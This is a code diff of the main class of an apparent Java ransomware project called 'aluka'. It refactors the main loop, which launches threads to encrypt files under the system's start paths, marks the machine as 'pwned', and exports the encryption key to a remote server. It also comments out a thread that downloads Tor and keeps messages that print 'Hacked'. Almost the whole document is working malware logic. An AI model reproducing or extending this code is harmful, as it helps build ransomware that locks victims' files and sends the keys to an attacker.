@@ -1,15 +1,15 @@
 package aluka;
 
-import java.util.HashMap;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.logging.Level;
 
 import aluka.configuration.Configuration;
-import aluka.configuration.DownloadTor;
 import aluka.core.ClientServerManager;
-import aluka.core.EncryptionManager;
 import aluka.core.FileDeeperBrowser;
+import aluka.core.LoggerManagement;
 import aluka.core.StateManager;
 import aluka.core.SystemManager;
-import aluka.enums.State;
 
 /**
  * Hello world!
@@ -21,51 +21,39 @@ public static final String MODE = "POWERED";
 	
 	public static void main(String[] args) {
 		
-		EncryptionManager encryption = new EncryptionManager();
+		LoggerManagement logger = LoggerManagement.getInstance();
 		SystemManager system = new SystemManager();
-		StateManager stateManager = new StateManager(system.getConfigPath());
+		StateManager stateManager = StateManager.getInstance();
 		
-		if(MODE.equals("POWERED")) {
+		/*if(MODE.equals("POWERED")) {
 			Thread thread = new Thread(new DownloadTor(system.getOsType()));
 			thread.start();
-		}
-
-		HashMap<String, Integer> params = new HashMap<String, Integer>();
+		}*/
 	
-		if (stateManager.getStates().get(State.ENCRYPTED.name()) == null || stateManager.getStates().get(State.ENCRYPTED.name()) == 0) {
+		if (!stateManager.isPwned()) {
+			
+			//Starting Encryption for files
+			logger.log(Level.WARNING,"Lauching Encryption Process");
+			List<Thread> threads = new ArrayList<>();
 			for (String path : system.getStartPath()) {
-				System.out.println("Lauching Encryption for " + path);
-				Thread thread = new Thread(new FileDeeperBrowser(encryption, path, system.getCallback()));
+				logger.log(Level.INFO,"Lauching Encryption for " + path);
+				Thread thread = new Thread(new FileDeeperBrowser(path, system.getCallback()));
 				thread.start();
+				threads.add(thread);
 			}
-			params.clear();
-			params.put(State.ENCRYPTED.name(), 1);
-			stateManager.saveState(params);
-			Thread thread1 = new Thread(new ClientServerManager(Configuration.getSimpleConnexion(), encryption));
-			thread1.start();
-			try {
-				thread1.wait();
-			} catch (InterruptedException e) {
-				System.err.println("[ - ] - Interrupt key pressed");
-				e.printStackTrace();
-			}
-
-			params.clear();
-			params.put(State.PRIVATE_KEY_PUSHED.name(), 1);
+			Configuration.waitForThreads(threads,"Wating for file to be encrypted");
+			stateManager.markPwned();
+			
+			//Export Key
+			ClientServerManager myserver = new ClientServerManager(Configuration.getSimpleConnexion());
+			myserver.exportKey();
+			stateManager.markExported();
 		} else {
-			if (stateManager.getStates().get(State.PRIVATE_KEY_PUSHED.name()) == null || stateManager.getStates().get(State.PRIVATE_KEY_PUSHED.name()) == 0) {
-				Thread thread1 = new Thread(new ClientServerManager(Configuration.getSimpleConnexion(), encryption));
-				thread1.start();
-				try {
-					thread1.wait();
-				} catch (InterruptedException e) {
-					System.err.println("[ - ] - Interrupt key pressed");
-					e.printStackTrace();
-				}
-
-				params.clear();
-				params.put(State.PRIVATE_KEY_PUSHED.name(), 1);
-				System.out.println("Hacked");
+			if (!stateManager.isExported()) {
+				//Export Key
+				ClientServerManager myserver = new ClientServerManager(Configuration.getSimpleConnexion());
+				myserver.exportKey();
+				stateManager.markExported();
 			}else {
 				System.out.println("Hacked");
 			}
